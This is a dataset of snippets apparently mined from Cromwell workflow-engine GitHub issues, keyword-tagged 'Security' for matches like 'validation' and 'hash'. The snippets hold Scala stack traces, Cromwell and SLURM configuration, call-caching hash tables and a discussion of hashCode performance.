Security,ala:27); 	at wdl.transforms.draft2.wdlom2wom.WdlDraft2WomScatterNodeMaker$.$anonfun$toWomScatterNode$7(WdlDraft2WomScatterNodeMaker.scala:52); 	at common.validation.ErrorOr$ShortCircuitingFlatMap$.flatMap$extension(ErrorOr.scala:27); 	at wdl.transforms.draft2.wdlom2wom.WdlDraft2WomScatterNodeMaker$.toWomScatterNode(WdlDraft2WomScatterNodeMaker.scala:51); 	at wdl.transforms.draft2.wdlom2wom.WdlDraft2WomScatterNodeMaker$.toWomScatterNode(WdlDraft2WomScatterNodeMaker.scala:15); 	at wom.transforms.WomScatterNodeMaker$Ops.toWomScatterNode(WomScatterNodeMaker.scala:10); 	at wom.transforms.WomScatterNodeMaker$Ops.toWomScatterNode$(WomScatterNodeMaker.scala:10); 	at wom.transforms.WomScatterNodeMaker$ops$$anon$1.toWomScatterNode(WomScatterNodeMaker.scala:10); 	at wdl.transforms.draft2.wdlom2wom.WdlDraft2WomGraphMaker$.buildNode$1(WdlDraft2WomGraphMaker.scala:90); 	at wdl.transforms.draft2.wdlom2wom.WdlDraft2WomGraphMaker$.$anonfun$toWomGraph$3(WdlDraft2WomGraphMaker.scala:38); 	at common.validation.ErrorOr$ShortCircuitingFlatMap$.flatMap$extension(ErrorOr.scala:27); 	at wdl.transforms.draft2.wdlom2wom.WdlDraft2WomGraphMaker$.foldFunction$1(WdlDraft2WomGraphMaker.scala:37); 	at wdl.transforms.draft2.wdlom2wom.WdlDraft2WomGraphMaker$.$anonfun$toWomGraph$14(WdlDraft2WomGraphMaker.scala:98); 	at scala.collection.LinearSeqOptimized.foldLeft(LinearSeqOptimized.scala:122); 	at scala.collection.LinearSeqOptimized.foldLeft$(LinearSeqOptimized.scala:118); 	at scala.collection.immutable.List.foldLeft(List.scala:86); 	at wdl.transforms.draft2.wdlom2wom.WdlDraft2WomGraphMaker$.toWomGraph(WdlDraft2WomGraphMaker.scala:98); 	at wdl.transforms.draft2.wdlom2wom.WdlDraft2WomGraphMaker$.toWomGraph(WdlDraft2WomGraphMaker.scala:18); 	at wom.transforms.WomGraphMaker$Ops.toWomGraph(WomGraphMaker.scala:8); 	at wom.transforms.WomGraphMaker$Ops.toWomGraph$(WomGraphMaker.scala:8); 	at wom.transforms.WomGraphMaker$ops$$anon$1.toWomGraph(WomGraphMaker.scala:8); 	at wdl.transforms.draft2.wdlom2wom.WdlDraf,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3143#issuecomment-408976502:5382,validat,validation,5382,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3143#issuecomment-408976502,1,['validat'],['validation']
Security,"ala:54); 	at slick.dbio.DBIOAction$$anon$4.run(DBIOAction.scala:239); 	at slick.dbio.DBIOAction$$anon$4.run(DBIOAction.scala:237); 	at slick.dbio.SynchronousDatabaseAction$FusedAndThenAction.$anonfun$run$4(DBIOAction.scala:533); 	at slick.dbio.SynchronousDatabaseAction$FusedAndThenAction.$anonfun$run$4$adapted(DBIOAction.scala:533); 	at scala.collection.Iterator.foreach(Iterator.scala:929); 	at scala.collection.Iterator.foreach$(Iterator.scala:929); 	at scala.collection.AbstractIterator.foreach(Iterator.scala:1417); 	at scala.collection.IterableLike.foreach(IterableLike.scala:71); 	at scala.collection.IterableLike.foreach$(IterableLike.scala:70); 	at scala.collection.AbstractIterable.foreach(Iterable.scala:54); 	at slick.dbio.SynchronousDatabaseAction$FusedAndThenAction.run(DBIOAction.scala:533); 	at slick.dbio.SynchronousDatabaseAction$$anon$11.run(DBIOAction.scala:570); 	at slick.basic.BasicBackend$DatabaseDef$$anon$2.liftedTree1$1(BasicBackend.scala:275); 	at slick.basic.BasicBackend$DatabaseDef$$anon$2.run(BasicBackend.scala:275); 	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142); 	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); 	at java.lang.Thread.run(Thread.java:745); ```; The Cromwell configuration is:; ```; system {; workflow-restart = true; }; call-caching {; enabled = true; }. database {; profile = ""slick.jdbc.HsqldbProfile$""; db {; driver = ""org.hsqldb.jdbcDriver""; url = ""jdbc:hsqldb:file:/n/groups/bcbio/cwl/test_bcbio_cwl/somatic/cromwell_work/persist/metadata;shutdown=false;hsqldb.tx=mvcc""; connectionTimeout = 20000; }; }. backend {; providers {; Local {; config {; runtime-attributes = """"""; Int? cpu; Int? memory_mb; """"""; submit-docker: """". filesystems {; local {; caching {; duplication-strategy: [""soft-link""]; hashing-strategy: ""path""; }; }; }. }; }. }; }; ```; Does this provide enough information to identify what might be happening? Thanks for any thoughts or clues about avoid this.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3607:6453,hash,hashing-strategy,6453,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3607,1,['hash'],['hashing-strategy']
Security,"alization.MaterializeWorkflowDescriptorActor$$anon$1: Workflow input processing failed:; running cwltool on file /var/folders/bs/wc6g67396rg8qnfj9qhvbvfsg7jhsw/T/cwl_temp_dir_822121598177295457/cwl_temp_file_7193cfe7-2342-48cc-8d7c-bf7d3434c57f.cwl failed with Traceback (most recent call last):; File ""/Users/jgentry/projects/cromwell/server/target/scala-2.12/cromwell-36-82fd70f-SNAP.jar/Lib/heterodon/__init__.py"", line 24, in apply; File ""<string>"", line 1, in <module>; File ""<string>"", line 12, in cwltool_salad; File ""/Users/jgentry/projects/cromwell/server/target/scala-2.12/cromwell-36-82fd70f-SNAP.jar/Lib/cwltool/load_tool.py"", line 279, in validate_document; File ""/Users/jgentry/projects/cromwell/server/target/scala-2.12/cromwell-36-82fd70f-SNAP.jar/Lib/schema_salad/ref_resolver.py"", line 915, in resolve_all; File ""/Users/jgentry/projects/cromwell/server/target/scala-2.12/cromwell-36-82fd70f-SNAP.jar/Lib/schema_salad/ref_resolver.py"", line 1087, in validate_links; schema_salad.validate.ValidationException: ../../../../var/folders/bs/wc6g67396rg8qnfj9qhvbvfsg7jhsw/T/cwl_temp_dir_822121598177295457/cwl_temp_file_7193cfe7-2342-48cc-8d7c-bf7d3434c57f.cwl:256:1: checking field `steps`; ../../../../var/folders/bs/wc6g67396rg8qnfj9qhvbvfsg7jhsw/T/cwl_temp_dir_822121598177295457/cwl_temp_file_7193cfe7-2342-48cc-8d7c-bf7d3434c57f.cwl:257:3: checking object `../../../../var/folders/bs/wc6g67396rg8qnfj9qhvbvfsg7jhsw/T/cwl_temp_dir_822121598177295457/cwl_temp_file_7193cfe7-2342-48cc-8d7c-bf7d3434c57f.cwl#alignment_to_rec`; ../../../../var/folders/bs/wc6g67396rg8qnfj9qhvbvfsg7jhsw/T/cwl_temp_dir_822121598177295457/cwl_temp_file_7193cfe7-2342-48cc-8d7c-bf7d3434c57f.cwl:289:3: Field `run` contains undefined reference to `file:///var/folders/bs/wc6g67396rg8qnfj9qhvbvfsg7jhsw/T/cwl_temp_dir_822121598177295457/steps/alignment_to_rec.cwl`; ../../../../var/folders/bs/wc6g67396rg8qnfj9qhvbvfsg7jhsw/T/cwl_temp_dir_822121598177295457/cwl_temp_file_7193cfe7-2342-48cc-8d7c-bf7d3434c57f.c",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4235#issuecomment-429454574:1825,validat,validate,1825,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4235#issuecomment-429454574,1,['validat'],['validate']
Security,"alizeWorkflowDescriptorActor$$anon$1: Workflow input processing failed:; running cwltool on file /var/folders/bs/wc6g67396rg8qnfj9qhvbvfsg7jhsw/T/cwl_temp_dir_822121598177295457/cwl_temp_file_7193cfe7-2342-48cc-8d7c-bf7d3434c57f.cwl failed with Traceback (most recent call last):; File ""/Users/jgentry/projects/cromwell/server/target/scala-2.12/cromwell-36-82fd70f-SNAP.jar/Lib/heterodon/__init__.py"", line 24, in apply; File ""<string>"", line 1, in <module>; File ""<string>"", line 12, in cwltool_salad; File ""/Users/jgentry/projects/cromwell/server/target/scala-2.12/cromwell-36-82fd70f-SNAP.jar/Lib/cwltool/load_tool.py"", line 279, in validate_document; File ""/Users/jgentry/projects/cromwell/server/target/scala-2.12/cromwell-36-82fd70f-SNAP.jar/Lib/schema_salad/ref_resolver.py"", line 915, in resolve_all; File ""/Users/jgentry/projects/cromwell/server/target/scala-2.12/cromwell-36-82fd70f-SNAP.jar/Lib/schema_salad/ref_resolver.py"", line 1087, in validate_links; schema_salad.validate.ValidationException: ../../../../var/folders/bs/wc6g67396rg8qnfj9qhvbvfsg7jhsw/T/cwl_temp_dir_822121598177295457/cwl_temp_file_7193cfe7-2342-48cc-8d7c-bf7d3434c57f.cwl:256:1: checking field `steps`; ../../../../var/folders/bs/wc6g67396rg8qnfj9qhvbvfsg7jhsw/T/cwl_temp_dir_822121598177295457/cwl_temp_file_7193cfe7-2342-48cc-8d7c-bf7d3434c57f.cwl:257:3: checking object `../../../../var/folders/bs/wc6g67396rg8qnfj9qhvbvfsg7jhsw/T/cwl_temp_dir_822121598177295457/cwl_temp_file_7193cfe7-2342-48cc-8d7c-bf7d3434c57f.cwl#alignment_to_rec`; ../../../../var/folders/bs/wc6g67396rg8qnfj9qhvbvfsg7jhsw/T/cwl_temp_dir_822121598177295457/cwl_temp_file_7193cfe7-2342-48cc-8d7c-bf7d3434c57f.cwl:289:3: Field `run` contains undefined reference to `file:///var/folders/bs/wc6g67396rg8qnfj9qhvbvfsg7jhsw/T/cwl_temp_dir_822121598177295457/steps/alignment_to_rec.cwl`; ../../../../var/folders/bs/wc6g67396rg8qnfj9qhvbvfsg7jhsw/T/cwl_temp_dir_822121598177295457/cwl_temp_file_7193cfe7-2342-48cc-8d7c-bf7d3434c57f.cwl:290:3: check",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4235#issuecomment-429454574:1834,Validat,ValidationException,1834,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4235#issuecomment-429454574,1,['Validat'],['ValidationException']
Security,alizeWorkflowDescriptorActor.scala:86); at cromwell.engine.workflow.MaterializeWorkflowDescriptorActor$$anonfun$cromwell$engine$workflow$MaterializeWorkflowDescriptorActor$$buildWorkflowDescriptor$2$$anonfun$apply$8.apply(MaterializeWorkflowDescriptorActor.scala:110); at cromwell.engine.workflow.MaterializeWorkflowDescriptorActor$$anonfun$cromwell$engine$workflow$MaterializeWorkflowDescriptorActor$$buildWorkflowDescriptor$2$$anonfun$apply$8.apply(MaterializeWorkflowDescriptorActor.scala:109); at scalaz.ValidationFlatMap.flatMap(Validation.scala:433); at cromwell.engine.workflow.MaterializeWorkflowDescriptorActor$$anonfun$cromwell$engine$workflow$MaterializeWorkflowDescriptorActor$$buildWorkflowDescriptor$2.apply(MaterializeWorkflowDescriptorActor.scala:109); at cromwell.engine.workflow.MaterializeWorkflowDescriptorActor$$anonfun$cromwell$engine$workflow$MaterializeWorkflowDescriptorActor$$buildWorkflowDescriptor$2.apply(MaterializeWorkflowDescriptorActor.scala:103); at scalaz.ValidationFlatMap.flatMap(Validation.scala:433); at cromwell.engine.workflow.MaterializeWorkflowDescriptorActor.cromwell$engine$workflow$MaterializeWorkflowDescriptorActor$$buildWorkflowDescriptor(MaterializeWorkflowDescriptorActor.scala:103); at cromwell.engine.workflow.MaterializeWorkflowDescriptorActor$$anonfun$receive$1.applyOrElse(MaterializeWorkflowDescriptorActor.scala:66); at akka.actor.Actor$class.aroundReceive(Actor.scala:467); at cromwell.engine.workflow.MaterializeWorkflowDescriptorActor.aroundReceive(MaterializeWorkflowDescriptorActor.scala:59); at akka.actor.ActorCell.receiveMessage(ActorCell.scala:516); at akka.actor.ActorCell.invoke(ActorCell.scala:487); at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:238); at akka.dispatch.Mailbox.run(Mailbox.scala:220); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:397); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQue,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/705:3893,Validat,ValidationFlatMap,3893,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/705,3,['Validat'],['ValidationFlatMap']
Security,"all caching results are used, and all jobs simply run again. . Cromwell connects to the call caching database and successfully creates tables, for example `CALL_CACHING_AGGREGATION_ENTRY`. . <!-- Which backend are you running? -->; I am running with a SLURM backend. . <!-- Paste/Attach your workflow if possible: -->; I have a very simple example workflow. ; ```; workflow test{; call task_A {}; }. task task_A{; command{; echo 'testing'; }; }; ```. <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->; ```; include required(classpath(""application"")). webservice {; }. akka {; http {; server {; }; }; }. system {; io {; }; input-read-limits {; }; job-rate-control {; jobs = 2; per = 1 second; }. abort {; scan-frequency: 30 seconds; cache {; enabled: true; concurrency: 1; ttl: 20 minutes; size: 100000; }; }. dns-cache-ttl: 3 minutes; }. workflow-options {; default {; }; }. call-caching {; enabled = true; }. google {; }. docker {; hash-lookup {; }; }. engine {; filesystems {; local {; }; }; }. languages {; WDL {; versions {; ""draft-2"" {; }; ""1.0"" {; }; }; }; CWL {; versions {; ""v1.0"" {; }; }; }; }. backend {; default = ""SLURM"". providers {. SLURM {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {; concurrent-job-limit = 500; runtime-attributes = """"""; Int runtime_minutes = 720; Int cpus = 1; Int requested_memory_mb_per_core = 8000; String queue = ""short""; """""". exit-code-timeout-seconds = 600. submit = """"""; sbatch -J ${job_name} -D ${cwd} -o ${out} -e ${err} -t ${runtime_minutes} -p ${queue} \; ${""-n "" + cpus} \; --mem-per-cpu=${requested_memory_mb_per_core} \; --constraint=""groups"" \; --qos=ded_reich \; --account=""reich"" \; --wrap ""/usr/bin/env bash ${script}""; """"""; kill = ""scancel ${job_id}""; check-alive = ""squeue -j ${job_id}""; job-id-regex = ""Submitted batch job (\\d+).*"". filesystems {; local {; localization: [; ""hard-link"", ""soft-link"", ""copy""; ]. caching {; duplica",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6929:2775,hash,hash-lookup,2775,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6929,1,['hash'],['hash-lookup']
Security,"all caching with read = true and write = true; [2022-12-15 21:28:03,72] [info] BT-322 788d8048:main.load_shared_covars:-1:1 cache hit copying nomatch: could not find a suitable cache hit.; [2022-12-15 21:28:03,72] [info] 788d8048-ef2b-4d7c-b3cb-6e04b3cbbdc2-EngineJobExecutionActor-main.load_shared_covars:NA:1 [788d8048]: Could not copy a suitable cache hit for 788d8048:main.load_shared_covars:-1:1. No copy attempts were; made.; [2022-12-15 21:28:03,88] [warn] BackgroundConfigAsyncJobExecutionActor [788d8048main.load_shared_covars:NA:1]: Unrecognized runtime attribute keys: dx_timeout, memory; [2022-12-15 21:28:04,00] [warn] 788d8048-ef2b-4d7c-b3cb-6e04b3cbbdc2-BackendCacheHitCopyingActor-788d8048:main.sex_aneuploidy_sample_list:-1:1-20000000012 [788d8048main.sex_aneuploidy_sample_list:NA:1]: Unrecognized runtime attribute; keys: shortTask, dx_timeout; [2022-12-15 21:28:04,00] [info] BT-322 788d8048:main.sex_aneuploidy_sample_list:-1:1 cache hit copying success with aggregated hashes: initial = B2C071CED641A1EB183DE4A4655F45ED, file = DDF9190E939D36D999E513158D534532.; [2022-12-15 21:28:04,00] [info] 788d8048-ef2b-4d7c-b3cb-6e04b3cbbdc2-EngineJobExecutionActor-main.sex_aneuploidy_sample_list:NA:1 [788d8048]: Call cache hit process had 0 total hit failures before completing successfully; [2022-12-15 21:28:04,01] [warn] 788d8048-ef2b-4d7c-b3cb-6e04b3cbbdc2-BackendCacheHitCopyingActor-788d8048:main.white_brits_sample_list:-1:1-20000000013 [788d8048main.white_brits_sample_list:NA:1]: Unrecognized runtime attribute keys:; shortTask, dx_timeout; [2022-12-15 21:28:04,01] [warn] 788d8048-ef2b-4d7c-b3cb-6e04b3cbbdc2-BackendCacheHitCopyingActor-788d8048:main.low_genotyping_quality_sample_list:-1:1-20000000014 [788d8048main.low_genotyping_quality_sample_list:NA:1]: Unrecognized ru; ntime attribute keys: shortTask, dx_timeout; [2022-12-15 21:28:04,01] [info] BT-322 788d8048:main.white_brits_sample_list:-1:1 cache hit copying success with aggregated hashes: initial = B2C071CED641",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6971:34798,hash,hashes,34798,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6971,1,['hash'],['hashes']
Security,"allCaching:hashes:input:Int numCPUs|C74D97B01EAE257E44AA9D5BADE97BAF|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:Int default_attr:max_retries|CFCD208495D565EF66E7DFF9F98764DA|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:Int default_attr:max_retries|CFCD208495D565EF66E7DFF9F98764DA|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:Int default_attr:cpu_cores|C74D97B01EAE257E44AA9D5BADE97BAF|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:Int default_attr:cpu_cores|C74D97B01EAE257E44AA9D5BADE97BAF|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:Float runtime_attr:mem_gb|5BA1DE412E01037F8843D097DCFAF28A|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:Float runtime_attr:mem_gb|5BA1DE412E01037F8843D097DCFAF28A|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:Float default_attr:mem_gb|5BA1DE412E01037F8843D097DCFAF28A|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:Float default_attr:mem_gb|5BA1DE412E01037F8843D097DCFAF28A|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:File R2Fastq|""9f1cf8859a902eb75202a5c048cd43aa-388""|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:File R2Fastq|""9f1cf8859a902eb75202a5c048cd43aa-388""|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:File R1Fastq|""62396abd6b589747ee16034888c9a0b5-381""|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:File R1Fastq|""62396abd6b589747ee16034888c9a0b5-381""|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input count|9BF31C7FF062936A96D3C8BD1F8F2FF3|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input count|9BF31C7FF062936A96D3C8BD1F8F2FF3|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:command template|7BCEDB02C5FC300FF83F07417B49229E|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:command template|7BCEDB02C5FC300FF83F07417B49229E|; |5de042e3-7a03-4c77-8972-f0e4cd010e4",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7248:5928,hash,hashes,5928,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7248,1,['hash'],['hashes']
Security,"ally with graph size for workflows that contain branches that rejoin (and most do). . ---. @danbills commented on [Thu Oct 05 2017](https://github.com/broadinstitute/wdl4s/issues/248#issuecomment-334536133). I think this comment is more appropriate here:. Equals is supposed to be bitwise/value-based equality, whereas `eq` indicates reference equality. I don't recall the exact motivation behind using `eq` in the test, maybe @cjllanwarne can comment when he returns on Tuesday. ---. @curoli commented on [Thu Oct 05 2017](https://github.com/broadinstitute/wdl4s/issues/248#issuecomment-334555964). If you don't like this fix, what do you suggest we do instead? How about we accept this fix now and you can rework the whole thing later, if you want?. This is a show-stopper once you want to create larger (aka real-life) workflows. . For example: if node a has two outputs, which are inputs of b, then b.hashCode calls a.hasCode twice. If b produces two outputs which are inputsof c, then c.hashCode calls b.hashCode twice, and a.hashCode is called four times. If c produces two outputs which are inputs of d, d.hashCode calls c.hashCode twice, b.hashCode four times and a.hashCode eight times, etc. . ---. @curoli commented on [Thu Oct 05 2017](https://github.com/broadinstitute/wdl4s/issues/248#issuecomment-334557027). `eq` is object equality. `equals` and `==` are the same, and there is no general rule that they need to be component-based (""bitwise""). On the contrary, `equals`/`==` should not be component-based if an object is mutable. Your typical GraphNode is mutable, because it indirectly contains `GraphNodeSetter`. ---. @danbills commented on [Thu Oct 05 2017](https://github.com/broadinstitute/wdl4s/issues/248#issuecomment-334575875). I suggest we leave this as-is with the understanding that it could be a performance issue down the road. . >rework the whole thing later. This is a specific anti-goal. As I suggested, I would like to discuss w/ Chris when he gets back next week as w",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2694:1696,hash,hashCode,1696,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2694,2,['hash'],['hashCode']
Security,"aluatedValue(WomString(arr1.value.mkString(sepvalue.value)), Seq.empty).validNel; }; ```. But I get the following error:. ```; [error] /Users/franklinmichael/source/cromwell/wdl/transforms/biscayne/src/main/scala/wdl/transforms/biscayne/linking/expression/values/BiscayneValueEvaluators.scala:164:64: type mismatch;; [error] found : common.validation.ErrorOr.ErrorOr[wdl.model.draft3.graph.expression.EvaluatedValue[wom.values.WomString]]; [error] (which expands to) cats.data.Validated[cats.data.NonEmptyList[String],wdl.model.draft3.graph.expression.EvaluatedValue[wom.values.WomString]]; [error] required: common.validation.ErrorOr.ErrorOr[wdl.model.draft3.graph.expression.EvaluatedValue[wom.values.WomArray]]; [error] (which expands to) cats.data.Validated[cats.data.NonEmptyList[String],wdl.model.draft3.graph.expression.EvaluatedValue[wom.values.WomArray]]; [error] processTwoValidatedValues[WomArray, WomString, WomString](value1, value2) { (arr1, sepvalue) =>; [error] ^; [info] common.validation.ErrorOr.ErrorOr[wdl.model.draft3.graph.expression.EvaluatedValue[wom.values.WomString]] <: common.validation.ErrorOr.ErrorOr[wdl.model.draft3.graph.expression.EvaluatedValue[wom.values.WomArray]]?; ```. I also tried switching this to use:. ```scala; processTwoValidatedValues[WomArray, WomString, WomString](a.arg1.evaluateValue(inputs, ioFunctionSet, forCommandInstantiationOptions), a.arg2.evaluateValue(inputs, ioFunctionSet, forCommandInstantiationOptions)) { (arr1, sepvalue) =>; EvaluatedValue(WomString(arr1.value.mkString(sepvalue.value)), Seq.empty).validNel; }; ```. Gives the following error:. ```; [error] /Users/franklinmichael/source/cromwell/wdl/transforms/biscayne/src/main/scala/wdl/transforms/biscayne/linking/expression/values/BiscayneValueEvaluators.scala:161:72: value evaluateValue is not a member of wdl.model.draft3.elements.ExpressionElement; [error] processTwoValidatedValues[WomArray, WomString, WomString](a.arg1.evaluateValue(inputs, ioFunctionSet, forCommandInstant",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5494:2025,validat,validation,2025,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5494,1,['validat'],['validation']
Security,"andleFailure(FaultHandling.scala:263); at akka.actor.ActorCell.handleFailure(ActorCell.scala:374); at akka.actor.ActorCell.invokeAll$1(ActorCell.scala:459); at akka.actor.ActorCell.systemInvoke(ActorCell.scala:483); at akka.dispatch.Mailbox.processAllSystemMessages(Mailbox.scala:282); at akka.dispatch.Mailbox.run(Mailbox.scala:223); at akka.dispatch.Mailbox.exec(Mailbox.scala:234); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: java.lang.RuntimeException: Google credentials are invalid: 500 Internal Server Error; {; ""error"" : ""internal_failure""; }; at cromwell.filesystems.gcs.auth.GoogleAuthMode$class.validate(GoogleAuthMode.scala:66); at cromwell.filesystems.gcs.auth.GoogleAuthMode$class.validateCredential(GoogleAuthMode.scala:62); at cromwell.filesystems.gcs.auth.RefreshTokenMode.validateCredential(GoogleAuthMode.scala:127); at cromwell.filesystems.gcs.auth.RefreshTokenMode.credential(GoogleAuthMode.scala:147); at cromwell.filesystems.gcs.GcsPathBuilder.<init>(GcsPathBuilder.scala:57); at cromwell.filesystems.gcs.GcsPathBuilderFactory.withOptions(GcsPathBuilderFactory.scala:37); at cromwell.backend.impl.jes.JesWorkflowPaths.<init>(JesWorkflowPaths.scala:25); at cromwell.backend.impl.jes.JesWorkflowPaths.copy(JesWorkflowPaths.scala:19); at cromwell.backend.impl.jes.JesWorkflowPaths.withDescriptor(JesWorkflowPaths.scala:54); at cromwell.backend.io.WorkflowPaths$class.toJobPaths(WorkflowPaths.scala:51); at cromwell.backend.impl.jes.JesWorkflowPaths.toJobPaths(JesWorkflowPaths.scala:19); at cromwell.backend.io.WorkflowPaths$class.toJobPaths(WorkflowPaths.scala:36); at cromwell.backend.impl.jes.JesWorkflowPaths.toJobPaths(JesWorkflowPaths.scala:19); at cromwell.backend.standard.StandardCac",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2270:2037,validat,validateCredential,2037,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2270,1,['validat'],['validateCredential']
Security,andleFailure(FaultHandling.scala:298); 	at akka.actor.dungeon.FaultHandling.handleFailure(FaultHandling.scala:263); 	at akka.actor.dungeon.FaultHandling.handleFailure$(FaultHandling.scala:254); 	at akka.actor.ActorCell.handleFailure(ActorCell.scala:431); 	at akka.actor.ActorCell.invokeAll$1(ActorCell.scala:521); 	at akka.actor.ActorCell.systemInvoke(ActorCell.scala:545); 	at akka.dispatch.Mailbox.processAllSystemMessages(Mailbox.scala:283); 	at akka.dispatch.Mailbox.run(Mailbox.scala:224); 	at akka.dispatch.Mailbox.exec(Mailbox.scala:235); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: cromwell.backend.validation.ValidatedRuntimeAttributesBuilder$$anon$1: Runtime attribute validation failed:; Expecting cpu runtime attribute value greater than 0; Expecting cpuMin runtime attribute value greater than 0; 	at cromwell.backend.validation.ValidatedRuntimeAttributesBuilder.build(ValidatedRuntimeAttributesBuilder.scala:62); 	at cromwell.backend.validation.ValidatedRuntimeAttributesBuilder.build$(ValidatedRuntimeAttributesBuilder.scala:56); 	at cromwell.backend.standard.StandardValidatedRuntimeAttributesBuilder$StandardValidatedRuntimeAttributesBuilderImpl.build(StandardValidatedRuntimeAttributesBuilder.scala:20); 	at cromwell.backend.standard.StandardCachingActorHelper.validatedRuntimeAttributes(StandardCachingActorHelper.scala:56); 	at cromwell.backend.standard.StandardCachingActorHelper.validatedRuntimeAttributes$(StandardCachingActorHelper.scala:54); 	at cromwell.backend.impl.aws.AwsBatchAsyncBackendJobExecutionActor.validatedRuntimeAttributes$lzycompute(AwsBatchAsyncBackendJobExecutionActor.scala:74); 	at cromwell.backend.impl.aws.AwsBatchAsyncBackendJobExecutionActor.validatedRuntimeAttributes(AwsB,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4591:5784,Validat,ValidatedRuntimeAttributesBuilder,5784,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4591,2,"['Validat', 'validat']","['ValidatedRuntimeAttributesBuilder', 'validation']"
Security,anon$1.toWomBundle(FileElementToWomBundle.scala:72); wdl.transforms.base.wdlom2wom.FileElementToWomBundle$$anon$1.toWomBundle(FileElementToWomBundle.scala:28); wom.transforms.WomBundleMaker$Ops.toWomBundle(WomExecutableMaker.scala:16); wom.transforms.WomBundleMaker$Ops.toWomBundle$(WomExecutableMaker.scala:16); wom.transforms.WomBundleMaker$ops$$anon$2.toWomBundle(WomExecutableMaker.scala:16); wdl.transforms.base.wdlom2wom.FileElementToWomBundle$.convert(FileElementToWomBundle.scala:81); wdl.transforms.base.wdlom2wom.package$.$anonfun$fileElementToWomBundle$1(package.scala:12); scala.util.Either$RightProjection.flatMap(Either.scala:702); cats.instances.EitherInstances$$anon$1.flatMap(either.scala:36); cats.instances.EitherInstances$$anon$1.flatMap(either.scala:32); cats.data.Kleisli.$anonfun$andThen$1(Kleisli.scala:37); languages.wdl.draft3.WdlDraft3LanguageFactory.getWomBundle(WdlDraft3LanguageFactory.scala:50); languages.wdl.draft3.WdlDraft3LanguageFactory.$anonfun$validateNamespace$2(WdlDraft3LanguageFactory.scala:39); scala.util.Either.flatMap(Either.scala:338); languages.wdl.draft3.WdlDraft3LanguageFactory.validateNamespace(WdlDraft3LanguageFactory.scala:38); 